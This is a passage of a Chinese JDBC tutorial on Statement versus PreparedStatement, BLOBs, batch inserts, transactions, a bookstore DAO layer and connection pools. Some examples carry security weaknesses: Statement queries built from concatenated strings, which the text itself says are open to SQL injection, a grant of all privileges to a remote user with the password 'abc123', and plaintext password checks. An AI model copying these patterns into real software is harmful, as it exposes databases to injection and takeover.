System.out.println(&quot;用户名或密码错误！&quot;); &#125; &#125; // 使用Statement实现对数据表的查询操作 public &lt;T&gt; T get(String sql, Class&lt;T&gt; clazz) &#123; T t = null; Connection conn = null; Statement st = null; ResultSet rs = null; try &#123; // 1.加载配置文件 InputStream is = StatementTest.class.getClassLoader().getResourceAsStream(&quot;jdbc.properties&quot;); Properties pros = new Properties(); pros.load(is); // 2.读取配置信息 String user = pros.getProperty(&quot;user&quot;); String password = pros.getProperty(&quot;password&quot;); String url = pros.getProperty(&quot;url&quot;); String driverClass = pros.getProperty(&quot;driverClass&quot;); // 3.加载驱动 Class.forName(driverClass); // 4.获取连接 conn = DriverManager.getConnection(url, user, password); st = conn.createStatement(); rs = st.executeQuery(sql); // 获取结果集的元数据 ResultSetMetaData rsmd = rs.getMetaData(); // 获取结果集的列数 int columnCount = rsmd.getColumnCount(); if (rs.next()) &#123; t = clazz.newInstance(); for (int i = 0; i &lt; columnCount; i++) &#123; // //1. 获取列的名称 // String columnName = rsmd.getColumnName(i+1); // 1. 获取列的别名 String columnName = rsmd.getColumnLabel(i + 1); // 2. 根据列名获取对应数据表中的数据 Object columnVal = rs.getObject(columnName); // 3. 将数据表中得到的数据，封装进对象 Field field = clazz.getDeclaredField(columnName); field.setAccessible(true); field.set(t, columnVal); &#125; return t; &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; finally &#123; // 关闭资源 if (rs != null) &#123; try &#123; rs.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if (st != null) &#123; try &#123; st.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; if (conn != null) &#123; try &#123; conn.close(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; &#125; &#125; return null; &#125;&#125; 综上： 3.3 PreparedStatement的使用3.3.1 PreparedStatement介绍 可以通过调用 Connection 对象的 preparedStatement(String sql) 方法获取 PreparedStatement 对象 PreparedStatement 接口是 Statement 的子接口，它表示一条预编译过的 SQL 语句 PreparedStatement 对象所代表的 SQL 语句中的参数用问号(?)来表示，调用 PreparedStatement 对象的 setXxx() 方法来设置这些参数. setXxx() 方法有两个参数，第一个参数是要设置的 SQL 语句中的参数的索引(从 1 开始)，第二个是设置的 SQL 语句中的参数的值 3.3.2 PreparedStatement vs Statement 代码的可读性和可维护性。 PreparedStatement 能最大可能提高性能： DBServer会对预编译语句提供性能优化。因为预编译语句有可能被重复调用，所以语句在被DBServer的编译器编译后的执行代码被缓存下来，那么下次调用时只要是相同的预编译语句就不需要编译，只要将参数直接传入编译过的语句执行代码中就会得到执行。 在statement语句中,即使是相同操作但因为数据内容不一样,所以整个语句本身不能匹配,没有缓存语句的意义.事实是没有数据库会对普通语句编译后的执行代码缓存。这样每执行一次都要对传入的语句编译一次。 (语法检查，语义检查，翻译成二进制命令，缓存) PreparedStatement 可以防止 SQL 注入 3.3.3 Java与SQL对应数据类型转换表 Java类型 SQL类型 boolean BIT byte TINYINT short SMALLINT int INTEGER long BIGINT String CHAR,VARCHAR,LONGVARCHAR byte array BINARY , VAR BINARY java.sql.Date DATE java.sql.Time TIME java.sql.Timestamp TIMESTAMP 3.3.4 使用PreparedStatement实现增、删、改操作1//通用的增、删、改操作（体现一：增、删、改 ； 体现二：针对于不同的表） public void update(String sql,Object ... args)&#123; Connection conn = null; PreparedStatement ps = null; try &#123; //1.获取数据库的连接 conn = JDBCUtils.getConnection(); //2.获取PreparedStatement的实例 (或：预编译sql语句) ps = conn.prepareStatement(sql); //3.填充占位符 for(int i = 0;i &lt; args.length;i++)&#123; ps.setObject(i + 1, args[i]); &#125; //4.执行sql语句 ps.execute(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;finally&#123; //5.关闭资源 JDBCUtils.closeResource(conn, ps); &#125; &#125; 3.3.5 使用PreparedStatement实现查询操作1// 通用的针对于不同表的查询:返回一个对象 (version 1.0) public &lt;T&gt; T getInstance(Class&lt;T&gt; clazz, String sql, Object... args) &#123; Connection conn = null; PreparedStatement ps = null; ResultSet rs = null; try &#123; // 1.获取数据库连接 conn = JDBCUtils.getConnection(); // 2.预编译sql语句，得到PreparedStatement对象 ps = conn.prepareStatement(sql); // 3.填充占位符 for (int i = 0; i &lt; args.length; i++) &#123; ps.setObject(i + 1, args[i]); &#125; // 4.执行executeQuery(),得到结果集：ResultSet rs = ps.executeQuery(); // 5.得到结果集的元数据：ResultSetMetaData ResultSetMetaData rsmd = rs.getMetaData(); // 6.1通过ResultSetMetaData得到columnCount,columnLabel；通过ResultSet得到列值 int columnCount = rsmd.getColumnCount(); if (rs.next()) &#123; T t = clazz.newInstance(); for (int i = 0; i &lt; columnCount; i++) &#123;// 遍历每一个列 // 获取列值 Object columnVal = rs.getObject(i + 1); // 获取列的别名:列的别名，使用类的属性名充当 String columnLabel = rsmd.getColumnLabel(i + 1); // 6.2使用反射，给对象的相应属性赋值 Field field = clazz.getDeclaredField(columnLabel); field.setAccessible(true); field.set(t, columnVal); &#125; return t; &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; finally &#123; // 7.关闭资源 JDBCUtils.closeResource(conn, ps, rs); &#125; return null; &#125; 说明：使用PreparedStatement实现的查询操作可以替换Statement实现的查询操作，解决Statement拼串和SQL注入问题。 3.4 ResultSet与ResultSetMetaData3.4.1 ResultSet 查询需要调用PreparedStatement 的 executeQuery() 方法，查询结果是一个ResultSet 对象 ResultSet 对象以逻辑表格的形式封装了执行数据库操作的结果集，ResultSet 接口由数据库厂商提供实现 ResultSet 返回的实际上就是一张数据表。有一个指针指向数据表的第一条记录的前面。 ResultSet 对象维护了一个指向当前数据行的游标，初始的时候，游标在第一行之前，可以通过 ResultSet 对象的 next() 方法移动到下一行。调用 next()方法检测下一行是否有效。若有效，该方法返回 true，且指针下移。相当于Iterator对象的 hasNext() 和 next() 方法的结合体。 当指针指向一行时, 可以通过调用 getXxx(int index) 或 getXxx(int columnName) 获取每一列的值。 例如: getInt(1), getString(“name”) 注意：Java与数据库交互涉及到的相关Java API中的索引都从1开始。 ResultSet 接口的常用方法： boolean next() getString() … 3.4.2 ResultSetMetaData 可用于获取关于 ResultSet 对象中列的类型和属性信息的对象 ResultSetMetaData meta = rs.getMetaData(); getColumnName(int column)：获取指定列的名称 getColumnLabel(int column)：获取指定列的别名 getColumnCount()：返回当前 ResultSet 对象中的列数。 getColumnTypeName(int column)：检索指定列的数据库特定的类型名称。 getColumnDisplaySize(int column)：指示指定列的最大标准宽度，以字符为单位。 isNullable(int column)：指示指定列中的值是否可以为 null。 isAutoIncrement(int column)：指示是否自动为指定列进行编号，这样这些列仍然是只读的。 问题1：得到结果集后, 如何知道该结果集中有哪些列 ？ 列名是什么？ ​ 需要使用一个描述 ResultSet 的对象， 即 ResultSetMetaData 问题2：关于ResultSetMetaData 如何获取 ResultSetMetaData： 调用 ResultSet 的 getMetaData() 方法即可 获取 ResultSet 中有多少列：调用 ResultSetMetaData 的 getColumnCount() 方法 获取 ResultSet 每一列的列的别名是什么：调用 ResultSetMetaData 的getColumnLabel() 方法 3.5 资源的释放 释放ResultSet, Statement,Connection。 数据库连接（Connection）是非常稀有的资源，用完后必须马上释放，如果Connection不能及时正确的关闭将导致系统宕机。Connection的使用原则是尽量晚创建，尽量早的释放。 可以在finally中关闭，保证及时其他代码出现异常，资源也一定能被关闭。 3.6 JDBC API小结 两种思想 面向接口编程的思想 ORM思想(object relational mapping) 一个数据表对应一个java类 表中的一条记录对应java类的一个对象 表中的一个字段对应java类的一个属性 sql是需要结合列名和表的属性名来写。注意起别名。 两种技术 JDBC结果集的元数据：ResultSetMetaData 获取列数：getColumnCount() 获取列的别名：getColumnLabel() 通过反射，创建指定类的对象，获取指定的属性并赋值 章节练习练习题1：从控制台向数据库的表customers中插入一条数据，表结构如下： 练习题2：创立数据库表 examstudent，表结构如下： 向数据表中添加如下数据： 代码实现1：插入一个新的student 信息 请输入考生的详细信息 Type:IDCard:ExamCard:StudentName:Location:Grade: 信息录入成功! 代码实现2：在 eclipse中建立 java 程序：输入身份证号或准考证号可以查询到学生的基本信息。结果如下： 代码实现3：完成学生信息的删除功能 第4章 操作BLOB类型字段4.1 MySQL BLOB类型 MySQL中，BLOB是一个二进制大型对象，是一个可以存储大量数据的容器，它能容纳不同大小的数据。 插入BLOB类型的数据必须使用PreparedStatement，因为BLOB类型的数据无法使用字符串拼接写的。 MySQL的四种BLOB类型(除了在存储的最大信息量上不同外，他们是等同的) 实际使用中根据需要存入的数据大小定义不同的BLOB类型。 需要注意的是：如果存储的文件过大，数据库的性能会下降。 如果在指定了相关的Blob类型以后，还报错：xxx too large，那么在mysql的安装目录下，找my.ini文件加上如下的配置参数： max_allowed_packet=16M。同时注意：修改了my.ini文件之后，需要重新启动mysql服务。 4.2 向数据表中插入大数据类型1//获取连接Connection conn = JDBCUtils.getConnection(); String sql = &quot;insert into customers(name,email,birth,photo)values(?,?,?,?)&quot;;PreparedStatement ps = conn.prepareStatement(sql);// 填充占位符ps.setString(1, &quot;徐海强&quot;);ps.setString(2, &quot;xhq@126.com&quot;);ps.setDate(3, new Date(new java.util.Date().getTime()));// 操作Blob类型的变量FileInputStream fis = new FileInputStream(&quot;xhq.png&quot;);ps.setBlob(4, fis);//执行ps.execute(); fis.close();JDBCUtils.closeResource(conn, ps); 4.3 修改数据表中的Blob类型字段1Connection conn = JDBCUtils.getConnection();String sql = &quot;update customers set photo = ? where id = ?&quot;;PreparedStatement ps = conn.prepareStatement(sql);// 填充占位符// 操作Blob类型的变量FileInputStream fis = new FileInputStream(&quot;coffee.png&quot;);ps.setBlob(1, fis);ps.setInt(2, 25);ps.execute();fis.close();JDBCUtils.closeResource(conn, ps); 4.4 从数据表中读取大数据类型1String sql = &quot;SELECT id, name, email, birth, photo FROM customer WHERE id = ?&quot;;conn = getConnection();ps = conn.prepareStatement(sql);ps.setInt(1, 8);rs = ps.executeQuery();if(rs.next())&#123; Integer id = rs.getInt(1); String name = rs.getString(2); String email = rs.getString(3); Date birth = rs.getDate(4); Customer cust = new Customer(id, name, email, birth); System.out.println(cust); //读取Blob类型的字段 Blob photo = rs.getBlob(5); InputStream is = photo.getBinaryStream(); OutputStream os = new FileOutputStream(&quot;c.jpg&quot;); byte [] buffer = new byte[1024]; int len = 0; while((len = is.read(buffer)) != -1)&#123; os.write(buffer, 0, len); &#125; JDBCUtils.closeResource(conn, ps, rs); if(is != null)&#123; is.close(); &#125; if(os != null)&#123; os.close(); &#125; &#125; 第5章 批量插入5.1 批量执行SQL语句当需要成批插入或者更新记录时，可以采用Java的批量更新机制，这一机制允许多条语句一次性提交给数据库批量处理。通常情况下比单独提交处理更有效率 JDBC的批量处理语句包括下面三个方法： addBatch(String)：添加需要批量处理的SQL语句或是参数； executeBatch()：执行批量处理语句； clearBatch():清空缓存的数据 通常我们会遇到两种批量执行SQL语句的情况： 多条SQL语句的批量处理； 一个SQL语句的批量传参； 5.2 高效的批量插入举例：向数据表中插入20000条数据 数据库中提供一个goods表。创建如下： 1CREATE TABLE goods(id INT PRIMARY KEY AUTO_INCREMENT,NAME VARCHAR(20)); 5.2.1 实现层次一：使用Statement1Connection conn = JDBCUtils.getConnection();Statement st = conn.createStatement();for(int i = 1;i &lt;= 20000;i++)&#123; String sql = &quot;insert into goods(name) values(&#x27;name_&#x27; + &quot;+ i +&quot;)&quot;; st.executeUpdate(sql);&#125; 5.2.2 实现层次二：使用PreparedStatement1long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); String sql = &quot;insert into goods(name)values(?)&quot;;PreparedStatement ps = conn.prepareStatement(sql);for(int i = 1;i &lt;= 20000;i++)&#123; ps.setString(1, &quot;name_&quot; + i); ps.executeUpdate();&#125; long end = System.currentTimeMillis();System.out.println(&quot;花费的时间为：&quot; + (end - start));//82340 JDBCUtils.closeResource(conn, ps); 5.2.3 实现层次三1/* * 修改1： 使用 addBatch() / executeBatch() / clearBatch() * 修改2：mysql服务器默认是关闭批处理的，我们需要通过一个参数，让mysql开启批处理的支持。 * ?rewriteBatchedStatements=true 写在配置文件的url后面 * 修改3：使用更新的mysql 驱动：mysql-connector-java-5.1.37-bin.jar * */@Testpublic void testInsert1() throws Exception&#123; long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); String sql = &quot;insert into goods(name)values(?)&quot;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i &lt;= 1000000;i++)&#123; ps.setString(1, &quot;name_&quot; + i); //1.“攒”sql ps.addBatch(); if(i % 500 == 0)&#123; //2.执行 ps.executeBatch(); //3.清空 ps.clearBatch(); &#125; &#125; long end = System.currentTimeMillis(); System.out.println(&quot;花费的时间为：&quot; + (end - start));//20000条：625 //1000000条:14733 JDBCUtils.closeResource(conn, ps);&#125; 5.2.4 实现层次四1/** 层次四：在层次三的基础上操作* 使用Connection 的 setAutoCommit(false) / commit()*/@Testpublic void testInsert2() throws Exception&#123; long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); //1.设置为不自动提交数据 conn.setAutoCommit(false); String sql = &quot;insert into goods(name)values(?)&quot;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i &lt;= 1000000;i++)&#123; ps.setString(1, &quot;name_&quot; + i); //1.“攒”sql ps.addBatch(); if(i % 500 == 0)&#123; //2.执行 ps.executeBatch(); //3.清空 ps.clearBatch(); &#125; &#125; //2.提交数据 conn.commit(); long end = System.currentTimeMillis(); System.out.println(&quot;花费的时间为：&quot; + (end - start));//1000000条:4978 JDBCUtils.closeResource(conn, ps);&#125; 第6章： 数据库事务6.1 数据库事务介绍 事务：一组逻辑操作单元,使数据从一种状态变换到另一种状态。 事务处理（事务操作）：保证所有事务都作为一个工作单元来执行，即使出现了故障，都不能改变这种执行方式。当在一个事务中执行多个操作时，要么所有的事务都被提交(commit)**，那么这些修改就永久地保存下来；要么数据库管理系统将放弃所作的所有修改，整个事务回滚(rollback)**到最初状态。 为确保数据库中数据的一致性，数据的操纵应当是离散的成组的逻辑单元：当它全部完成时，数据的一致性可以保持，而当这个单元中的一部分操作失败，整个事务应全部视为错误，所有从起始点以后的操作应全部回退到开始状态。 6.2 JDBC事务处理 数据一旦提交，就不可回滚。 数据什么时候意味着提交？ 当一个连接对象被创建时，默认情况下是自动提交事务：每次执行一个 SQL 语句时，如果执行成功，就会向数据库自动提交，而不能回滚。 关闭数据库连接，数据就会自动的提交。如果多个操作，每个操作使用的是自己单独的连接，则无法保证事务。即同一个事务的多个操作必须在同一个连接下。 JDBC程序中为了让多个 SQL 语句作为一个事务执行： 调用 Connection 对象的 setAutoCommit(false); 以取消自动提交事务 在所有的 SQL 语句都成功执行后，调用 commit(); 方法提交事务 在出现异常时，调用 rollback(); 方法回滚事务 若此时 Connection 没有被关闭，还可能被重复使用，则需要恢复其自动提交状态 setAutoCommit(true)。尤其是在使用数据库连接池技术时，执行close()方法前，建议恢复自动提交状态。 【案例：用户AA向用户BB转账100】 1public void testJDBCTransaction() &#123; Connection conn = null; try &#123; // 1.获取数据库连接 conn = JDBCUtils.getConnection(); // 2.开启事务 conn.setAutoCommit(false); // 3.进行数据库操作 String sql1 = &quot;update user_table set balance = balance - 100 where user = ?&quot;; update(conn, sql1, &quot;AA&quot;); // 模拟网络异常 //System.out.println(10 / 0); String sql2 = &quot;update user_table set balance = balance + 100 where user = ?&quot;; update(conn, sql2, &quot;BB&quot;); // 4.若没有异常，则提交事务 conn.commit(); &#125; catch (Exception e) &#123; e.printStackTrace(); // 5.若有异常，则回滚事务 try &#123; conn.rollback(); &#125; catch (SQLException e1) &#123; e1.printStackTrace(); &#125; &#125; finally &#123; try &#123; //6.恢复每次DML操作的自动提交功能 conn.setAutoCommit(true); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; //7.关闭连接 JDBCUtils.closeResource(conn, null, null); &#125; &#125; 其中，对数据库操作的方法为： 1//使用事务以后的通用的增删改操作（version 2.0）public void update(Connection conn ,String sql, Object... args) &#123; PreparedStatement ps = null; try &#123; // 1.获取PreparedStatement的实例 (或：预编译sql语句) ps = conn.prepareStatement(sql); // 2.填充占位符 for (int i = 0; i &lt; args.length; i++) &#123; ps.setObject(i + 1, args[i]); &#125; // 3.执行sql语句 ps.execute(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; finally &#123; // 4.关闭资源 JDBCUtils.closeResource(null, ps); &#125;&#125; 6.3 事务的ACID属性 原子性（Atomicity）原子性是指事务是一个不可分割的工作单位，事务中的操作要么都发生，要么都不发生。 一致性（Consistency）事务必须使数据库从一个一致性状态变换到另外一个一致性状态。 隔离性（Isolation）事务的隔离性是指一个事务的执行不能被其他事务干扰，即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。 持久性（Durability）持久性是指一个事务一旦被提交，它对数据库中数据的改变就是永久性的，接下来的其他操作和数据库故障不应该对其有任何影响。 6.3.1 数据库的并发问题 对于同时运行的多个事务, 当这些事务访问数据库中相同的数据时, 如果没有采取必要的隔离机制, 就会导致各种并发问题: 脏读: 对于两个事务 T1, T2, T1 读取了已经被 T2 更新但还没有被提交的字段。之后, 若 T2 回滚, T1读取的内容就是临时且无效的。 不可重复读: 对于两个事务T1, T2, T1 读取了一个字段, 然后 T2 更新了该字段。之后, T1再次读取同一个字段, 值就不同了。 幻读: 对于两个事务T1, T2, T1 从一个表中读取了一个字段, 然后 T2 在该表中插入了一些新的行。之后, 如果 T1 再次读取同一个表, 就会多出几行。 数据库事务的隔离性: 数据库系统必须具有隔离并发运行各个事务的能力, 使它们不会相互影响, 避免各种并发问题。 一个事务与其他事务隔离的程度称为隔离级别。数据库规定了多种事务隔离级别, 不同隔离级别对应不同的干扰程度, 隔离级别越高, 数据一致性就越好, 但并发性越弱。 6.3.2 四种隔离级别 数据库提供的4种事务隔离级别： Oracle 支持的 2 种事务隔离级别：READ COMMITED, SERIALIZABLE。 Oracle 默认的事务隔离级别为: READ COMMITED 。 Mysql 支持 4 种事务隔离级别。Mysql 默认的事务隔离级别为: REPEATABLE READ。 6.3.3 在MySql中设置隔离级别 每启动一个 mysql 程序, 就会获得一个单独的数据库连接. 每个数据库连接都有一个全局变量 @@tx_isolation, 表示当前的事务隔离级别。 查看当前的隔离级别: 1SELECT @@tx_isolation; 设置当前 mySQL 连接的隔离级别: 1set transaction isolation level read committed; 设置数据库系统的全局的隔离级别: 1set global transaction isolation level read committed; 补充操作： 创建mysql数据库用户： 1create user tom identified by &#39;abc123&#39;; 授予权限 1#授予通过网络方式登录的tom用户，对所有库所有表的全部权限，密码设为abc123.grant all privileges on *.* to tom@&#39;%&#39; identified by &#39;abc123&#39;; #给tom用户使用本地命令行方式，授予atguigudb这个库下的所有表的插删改查的权限。grant select,insert,delete,update on atguigudb.* to tom@localhost identified by &#39;abc123&#39;; 第7章：DAO及相关实现类 DAO：Data Access Object访问数据信息的类和接口，包括了对数据的CRUD（Create、Retrival、Update、Delete），而不包含任何业务相关的信息。有时也称作：BaseDAO 作用：为了实现功能的模块化，更有利于代码的维护和升级。 下面是尚硅谷JavaWeb阶段书城项目中DAO使用的体现： 层次结构： 【BaseDAO.java】1package com.atguigu.bookstore.dao;import java.lang.reflect.ParameterizedType;import java.lang.reflect.Type;import java.sql.Connection;import java.sql.SQLException;import java.util.List;import org.apache.commons.dbutils.QueryRunner;import org.apache.commons.dbutils.handlers.BeanHandler;import org.apache.commons.dbutils.handlers.BeanListHandler;import org.apache.commons.dbutils.handlers.ScalarHandler;/** * 定义一个用来被继承的对数据库进行基本操作的Dao * * @author HanYanBing * * @param &lt;T&gt; */public abstract class BaseDao&lt;T&gt; &#123; private QueryRunner queryRunner = new QueryRunner(); // 定义一个变量来接收泛型的类型 private Class&lt;T&gt; type; // 获取T的Class对象，获取泛型的类型，泛型是在被子类继承时才确定 public BaseDao() &#123; // 获取子类的类型 Class clazz = this.getClass(); // 获取父类的类型 // getGenericSuperclass()用来获取当前类的父类的类型 // ParameterizedType表示的是带泛型的类型 ParameterizedType parameterizedType = (ParameterizedType) clazz.getGenericSuperclass(); // 获取具体的泛型类型 getActualTypeArguments获取具体的泛型的类型 // 这个方法会返回一个Type的数组 Type[] types = parameterizedType.getActualTypeArguments(); // 获取具体的泛型的类型· this.type = (Class&lt;T&gt;) types[0]; &#125; /** * 通用的增删改操作 * * @param sql * @param params * @return */ public int update(Connection conn,String sql, Object... params) &#123; int count = 0; try &#123; count = queryRunner.update(conn, sql, params); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; return count; &#125; /** * 获取一个对象 * * @param sql * @param params * @return */ public T getBean(Connection conn,String sql, Object... params) &#123; T t = null; try &#123; t = queryRunner.query(conn, sql, new BeanHandler&lt;T&gt;(type), params); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; return t; &#125; /** * 获取所有对象 * * @param sql * @param params * @return */ public List&lt;T&gt; getBeanList(Connection conn,String sql, Object... params) &#123; List&lt;T&gt; list = null; try &#123; list = queryRunner.query(conn, sql, new BeanListHandler&lt;T&gt;(type), params); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; return list; &#125; /** * 获取一个但一值得方法，专门用来执行像 select count(*)...这样的sql语句 * * @param sql * @param params * @return */ public Object getValue(Connection conn,String sql, Object... params) &#123; Object count = null; try &#123; // 调用queryRunner的query方法获取一个单一的值 count = queryRunner.query(conn, sql, new ScalarHandler&lt;&gt;(), params); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; return count; &#125;&#125; 【BookDAO.java】1package com.atguigu.bookstore.dao;import java.sql.Connection;import java.util.List;import com.atguigu.bookstore.beans.Book;import com.atguigu.bookstore.beans.Page;public interface BookDao &#123; /** * 从数据库中查询出所有的记录 * * @return */ List&lt;Book&gt; getBooks(Connection conn); /** * 向数据库中插入一条记录 * * @param book */ void saveBook(Connection conn,Book book); /** * 从数据库中根据图书的id删除一条记录 * * @param bookId */ void deleteBookById(Connection conn,String bookId); /** * 根据图书的id从数据库中查询出一条记录 * * @param bookId * @return */ Book getBookById(Connection conn,String bookId); /** * 根据图书的id从数据库中更新一条记录 * * @param book */ void updateBook(Connection conn,Book book); /** * 获取带分页的图书信息 * * @param page：是只包含了用户输入的pageNo属性的page对象 * @return 返回的Page对象是包含了所有属性的Page对象 */ Page&lt;Book&gt; getPageBooks(Connection conn,Page&lt;Book&gt; page); /** * 获取带分页和价格范围的图书信息 * * @param page：是只包含了用户输入的pageNo属性的page对象 * @return 返回的Page对象是包含了所有属性的Page对象 */ Page&lt;Book&gt; getPageBooksByPrice(Connection conn,Page&lt;Book&gt; page, double minPrice, double maxPrice);&#125; 【UserDAO.java】1package com.atguigu.bookstore.dao;import java.sql.Connection;import com.atguigu.bookstore.beans.User;public interface UserDao &#123; /** * 根据User对象中的用户名和密码从数据库中获取一条记录 * * @param user * @return User 数据库中有记录 null 数据库中无此记录 */ User getUser(Connection conn,User user); /** * 根据User对象中的用户名从数据库中获取一条记录 * * @param user * @return true 数据库中有记录 false 数据库中无此记录 */ boolean checkUsername(Connection conn,User user); /** * 向数据库中插入User对象 * * @param user */ void saveUser(Connection conn,User user);&#125; 【BookDaoImpl.java】1package com.atguigu.bookstore.dao.impl;import java.sql.Connection;import java.util.List;import com.atguigu.bookstore.beans.Book;import com.atguigu.bookstore.beans.Page;import com.atguigu.bookstore.dao.BaseDao;import com.atguigu.bookstore.dao.BookDao;public class BookDaoImpl extends BaseDao&lt;Book&gt; implements BookDao &#123; @Override public List&lt;Book&gt; getBooks(Connection conn) &#123; // 调用BaseDao中得到一个List的方法 List&lt;Book&gt; beanList = null; // 写sql语句 String sql = &quot;select id,title,author,price,sales,stock,img_path imgPath from books&quot;; beanList = getBeanList(conn,sql); return beanList; &#125; @Override public void saveBook(Connection conn,Book book) &#123; // 写sql语句 String sql = &quot;insert into books(title,author,price,sales,stock,img_path) values(?,?,?,?,?,?)&quot;; // 调用BaseDao中通用的增删改的方法 update(conn,sql, book.getTitle(), book.getAuthor(), book.getPrice(), book.getSales(), book.getStock(),book.getImgPath()); &#125; @Override public void deleteBookById(Connection conn,String bookId) &#123; // 写sql语句 String sql = &quot;DELETE FROM books WHERE id = ?&quot;; // 调用BaseDao中通用增删改的方法 update(conn,sql, bookId); &#125; @Override public Book getBookById(Connection conn,String bookId) &#123; // 调用BaseDao中获取一个对象的方法 Book book = null; // 写sql语句 String sql = &quot;select id,title,author,price,sales,stock,img_path imgPath from books where id = ?&quot;; book = getBean(conn,sql, bookId); return book; &#125; @Override public void updateBook(Connection conn,Book book) &#123; // 写sql语句 String sql = &quot;update books set title = ? , author = ? , price = ? , sales = ? , stock = ? where id = ?&quot;; // 调用BaseDao中通用的增删改的方法 update(conn,sql, book.getTitle(), book.getAuthor(), book.getPrice(), book.getSales(), book.getStock(), book.getId()); &#125; @Override public Page&lt;Book&gt; getPageBooks(Connection conn,Page&lt;Book&gt; page) &#123; // 获取数据库中图书的总记录数 String sql = &quot;select count(*) from books&quot;; // 调用BaseDao中获取一个单一值的方法 long totalRecord = (long) getValue(conn,sql); // 将总记录数设置都page对象中 page.setTotalRecord((int) totalRecord); // 获取当前页中的记录存放的List String sql2 = &quot;select id,title,author,price,sales,stock,img_path imgPath from books limit ?,?&quot;; // 调用BaseDao中获取一个集合的方法 List&lt;Book&gt; beanList = getBeanList(conn,sql2, (page.getPageNo() - 1) * Page.PAGE_SIZE, Page.PAGE_SIZE); // 将这个List设置到page对象中 page.setList(beanList); return page; &#125; @Override public Page&lt;Book&gt; getPageBooksByPrice(Connection conn,Page&lt;Book&gt; page, double minPrice, double maxPrice) &#123; // 获取数据库中图书的总记录数 String sql = &quot;select count(*) from books where price between ? and ?&quot;; // 调用BaseDao中获取一个单一值的方法 long totalRecord = (long) getValue(conn,sql,minPrice,maxPrice); // 将总记录数设置都page对象中 page.setTotalRecord((int) totalRecord); // 获取当前页中的记录存放的List String sql2 = &quot;select id,title,author,price,sales,stock,img_path imgPath from books where price between ? and ? limit ?,?&quot;; // 调用BaseDao中获取一个集合的方法 List&lt;Book&gt; beanList = getBeanList(conn,sql2, minPrice , maxPrice , (page.getPageNo() - 1) * Page.PAGE_SIZE, Page.PAGE_SIZE); // 将这个List设置到page对象中 page.setList(beanList); return page; &#125;&#125; 【UserDaoImpl.java】1package com.atguigu.bookstore.dao.impl;import java.sql.Connection;import com.atguigu.bookstore.beans.User;import com.atguigu.bookstore.dao.BaseDao;import com.atguigu.bookstore.dao.UserDao;public class UserDaoImpl extends BaseDao&lt;User&gt; implements UserDao &#123; @Override public User getUser(Connection conn,User user) &#123; // 调用BaseDao中获取一个对象的方法 User bean = null; // 写sql语句 String sql = &quot;select id,username,password,email from users where username = ? and password = ?&quot;; bean = getBean(conn,sql, user.getUsername(), user.getPassword()); return bean; &#125; @Override public boolean checkUsername(Connection conn,User user) &#123; // 调用BaseDao中获取一个对象的方法 User bean = null; // 写sql语句 String sql = &quot;select id,username,password,email from users where username = ?&quot;; bean = getBean(conn,sql, user.getUsername()); return bean != null; &#125; @Override public void saveUser(Connection conn,User user) &#123; //写sql语句 String sql = &quot;insert into users(username,password,email) values(?,?,?)&quot;; //调用BaseDao中通用的增删改的方法 update(conn,sql, user.getUsername(),user.getPassword(),user.getEmail()); &#125;&#125; 【Book.java】1package com.atguigu.bookstore.beans;/** * 图书类 * @author songhongkang * */public class Book &#123; private Integer id; private String title; // 书名 private String author; // 作者 private double price; // 价格 private Integer sales; // 销量 private Integer stock; // 库存 private String imgPath = &quot;static/img/default.jpg&quot;; // 封面图片的路径 //构造器，get()，set()，toString()方法略&#125; 【Page.java】1package com.atguigu.bookstore.beans;import java.util.List;/** * 页码类 * @author songhongkang * */public class Page&lt;T&gt; &#123; private List&lt;T&gt; list; // 每页查到的记录存放的集合 public static final int PAGE_SIZE = 4; // 每页显示的记录数 private int pageNo; // 当前页// private int totalPageNo; // 总页数，通过计算得到 private int totalRecord; // 总记录数，通过查询数据库得到 【User.java】1package com.atguigu.bookstore.beans;/** * 用户类 * @author songhongkang * */public class User &#123; private Integer id; private String username; private String password; private String email; 第8章：数据库连接池8.1 JDBC数据库连接池的必要性 在使用开发基于数据库的web程序时，传统的模式基本是按以下步骤： 在主程序（如servlet、beans）中建立数据库连接 进行sql操作 断开数据库连接 这种模式开发，存在的问题: 普通的JDBC数据库连接使用 DriverManager 来获取，每次向数据库建立连接的时候都要将 Connection 加载到内存中，再验证用户名和密码(得花费0.05s～1s的时间)。需要数据库连接的时候，就向数据库要求一个，执行完成后再断开连接。这样的方式将会消耗大量的资源和时间。数据库的连接资源并没有得到很好的重复利用。若同时有几百人甚至几千人在线，频繁的进行数据库连接操作将占用很多的系统资源，严重的甚至会造成服务器的崩溃。 对于每一次数据库连接，使用完后都得断开。否则，如果程序出现异常而未能关闭，将会导致数据库系统中的内存泄漏，最终将导致重启数据库。（回忆：何为Java的内存泄漏？） 这种开发不能控制被创建的连接对象数，系统资源会被毫无顾及的分配出去，如连接过多，也可能导致内存泄漏，服务器崩溃。 8.2 数据库连接池技术 为解决传统开发中的数据库连接问题，可以采用数据库连接池技术。 数据库连接池的基本思想：就是为数据库连接建立一个“缓冲池”。预先在缓冲池中放入一定数量的连接，当需要建立数据库连接时，只需从“缓冲池”中取出一个，使用完毕之后再放回去。 数据库连接池负责分配、管理和释放数据库连接，它允许应用程序重复使用一个现有的数据库连接，而不是重新建立一个。 数据库连接池在初始化时将创建一定数量的数据库连接放到连接池中，这些数据库连接的数量是由最小数据库连接数来设定的。无论这些数据库连接是否被使用，连接池都将一直保证至少拥有这么多的连接数量。连接池的最大数据库连接数量限定了这个连接池能占有的最大连接数，当应用程序向连接池请求的连接数超过最大连接数量时，这些请求将被加入到等待队列中。 工作原理： 